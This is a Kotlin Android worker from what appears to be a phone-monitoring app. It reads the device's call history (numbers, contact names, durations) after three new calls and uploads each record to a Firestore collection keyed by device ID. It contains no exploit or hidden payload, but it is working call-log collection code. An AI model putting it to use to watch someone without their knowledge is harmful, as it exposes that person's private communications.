package com.mshomeguardian.logger.workers

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.CallLog
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.mshomeguardian.logger.data.AppDatabase
import com.mshomeguardian.logger.data.CallLogEntity
import com.mshomeguardian.logger.utils.DeviceIdentifier
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.*

class CallLogWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    private val db = AppDatabase.getInstance(context.applicationContext)
    private val deviceId = DeviceIdentifier.getPersistentDeviceId(context.applicationContext)

    private val firestore: FirebaseFirestore? = try {
        FirebaseFirestore.getInstance()
    } catch (e: Exception) {
        Log.e(TAG, "Failed to initialize Firestore", e)
        null
    }

    companion object {
        private const val TAG = "CallLogWorker"
        private const val SYNC_LIMIT = 500 // Limit number of call logs to sync at once

        // New threshold for automatic synchronization
        private const val CALL_COUNT_THRESHOLD = 3

        /**
         * Check if there are enough new calls to trigger a sync
         */
        suspend fun shouldSync(context: Context): Boolean {
            // Skip check if permission is not granted
            if (ContextCompat.checkSelfPermission(
                    context, Manifest.permission.READ_CALL_LOG
                ) != PackageManager.PERMISSION_GRANTED) {
                return false
            }

            try {
                val lastSyncTime = context.getSharedPreferences(
                    "call_log_sync", Context.MODE_PRIVATE).getLong("last_sync_time", 0)

                // Query the number of new calls since last sync
                val uri = CallLog.Calls.CONTENT_URI
                val projection = arrayOf(CallLog.Calls._ID)
                val selection = "${CallLog.Calls.DATE} > ?"
                val selectionArgs = arrayOf(lastSyncTime.toString())

                context.contentResolver.query(
                    uri, projection, selection, selectionArgs, null
                )?.use { cursor ->
                    val count = cursor.count
                    Log.d(TAG, "Found $count new calls since last sync")
                    return count >= CALL_COUNT_THRESHOLD
                }

                return false
            } catch (e: Exception) {
                Log.e(TAG, "Error checking for new calls", e)
                return false
            }
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        return@withContext try {
            // Check permissions
            if (ContextCompat.checkSelfPermission(
                    applicationContext,
                    Manifest.permission.READ_CALL_LOG
                ) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Missing READ_CALL_LOG permission")
                return@withContext Result.failure()
            }

            // Get last sync time from shared preferences
            val prefs = applicationContext.getSharedPreferences("call_log_sync", Context.MODE_PRIVATE)
            val lastSyncTime = prefs.getLong("last_sync_time", 0)
            val currentTime = System.currentTimeMillis()

            // Sync call logs
            val syncCount = syncCallLogs(lastSyncTime, currentTime)

            // Upload new records to Firestore
            uploadNewRecords()

            // Update last sync time if successful
            prefs.edit().putLong("last_sync_time", currentTime).apply()

            Log.d(TAG, "Call log sync completed. Synced $syncCount records.")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error syncing call logs", e)
            Result.retry()
        }
    }

    // Update the syncCallLogs method to fix the LIMIT issue
    private suspend fun syncCallLogs(lastSyncTime: Long, currentTime: Long): Int {
        val callLogs = mutableListOf<CallLogEntity>()
        var cursor: Cursor? = null

        try {
            // Query call logs since last sync
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.NEW,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.CACHED_NUMBER_TYPE,
                CallLog.Calls.CACHED_NUMBER_LABEL,
                CallLog.Calls.CACHED_PHOTO_URI,
                CallLog.Calls.IS_READ
            )

            // Selection for calls after the last sync time
            val selection = "${CallLog.Calls.DATE} > ?"
            val selectionArgs = arrayOf(lastSyncTime.toString())
            // Remove LIMIT from sortOrder
            val sortOrder = "${CallLog.Calls.DATE} DESC"

            cursor = applicationContext.contentResolver.query(
                uri, projection, selection, selectionArgs, sortOrder
            )

            cursor?.let {
                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val newIndex = it.getColumnIndex(CallLog.Calls.NEW)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val photoUriIndex = it.getColumnIndex(CallLog.Calls.CACHED_PHOTO_URI)
                val isReadIndex = it.getColumnIndex(CallLog.Calls.IS_READ)

                // Add counter to limit records processed
                var recordsProcessed = 0

                while (it.moveToNext() && recordsProcessed < SYNC_LIMIT) {
                    val callId = if (idIndex >= 0) it.getString(idIndex) else UUID.randomUUID().toString()
                    val number = if (numberIndex >= 0) it.getString(numberIndex) ?: "" else ""
                    val date = if (dateIndex >= 0) it.getLong(dateIndex) else currentTime
                    val duration = if (durationIndex >= 0) it.getLong(durationIndex) else 0
                    val type = if (typeIndex >= 0) it.getInt(typeIndex) else CallLog.Calls.MISSED_TYPE
                    val isNew = if (newIndex >= 0) it.getInt(newIndex) == 1 else false
                    val name = if (nameIndex >= 0) it.getString(nameIndex) else null
                    val photoUri = if (photoUriIndex >= 0) it.getString(photoUriIndex) else null
                    val isRead = if (isReadIndex >= 0) it.getInt(isReadIndex) == 1 else false

                    // Create call log entity
                    val callLogEntity = CallLogEntity(
                        callId = callId,
                        syncTimestamp = currentTime,
                        phoneNumber = number,
                        timestamp = date,
                        duration = duration,
                        type = type,
                        contactName = name,
                        contactPhotoUri = photoUri,
                        isRead = isRead,
                        isNew = isNew,
                        deletedLocally = false,
                        uploadedToCloud = false,
                        deviceId = deviceId
                    )

                    // Check if call log already exists
                    val existingCallLog = db.callLogDao().getCallLogByCallId(callId)
                    if (existingCallLog == null) {
                        callLogs.add(callLogEntity)
                    } else {
                        // Update only if something changed
                        if (existingCallLog.isRead != isRead ||
                            existingCallLog.duration != duration ||
                            existingCallLog.contactName != name) {

                            // Keep existing flags
                            db.callLogDao().updateCallLog(callLogEntity.copy(
                                id = existingCallLog.id,
                                uploadedToCloud = existingCallLog.uploadedToCloud,
                                uploadTimestamp = existingCallLog.uploadTimestamp
                            ))
                        }
                    }

                    recordsProcessed++
                }
            }

            // Insert all new call logs
            if (callLogs.isNotEmpty()) {
                db.callLogDao().insertCallLogs(callLogs)
                Log.d(TAG, "Inserted ${callLogs.size} new call logs")
            }

            return callLogs.size
        } catch (e: Exception) {
            Log.e(TAG, "Error querying call logs", e)
            throw e
        } finally {
            cursor?.close()
        }
    }


    private suspend fun uploadNewRecords() {
        val firestoreInstance = firestore ?: return

        try {
            // Get call logs that haven't been uploaded
            val notUploadedCallLogs = db.callLogDao().getNotUploadedCallLogs()
            Log.d(TAG, "Found ${notUploadedCallLogs.size} call logs to upload")

            for (callLog in notUploadedCallLogs) {
                try {
                    // Upload to Firestore
                    firestoreInstance.collection("devices")
                        .document(deviceId)
                        .collection("call_logs")
                        .document(callLog.callId)
                        .set(callLog, SetOptions.merge())
                        .addOnSuccessListener {
                            // Mark as uploaded in a separate coroutine to avoid blocking
                            GlobalScope.launch(Dispatchers.IO) {
                                val uploadTime = System.currentTimeMillis()
                                db.callLogDao().markCallLogAsUploaded(callLog.id, uploadTime)
                                Log.d(TAG, "Call log ${callLog.callId} marked as uploaded")
                            }
                        }
                        .addOnFailureListener { e ->
                            Log.e(TAG, "Failed to upload call log ${callLog.callId}", e)
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading call log ${callLog.callId}", e)
                    // Continue with next record
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in uploadNewRecords", e)
        }
    }
}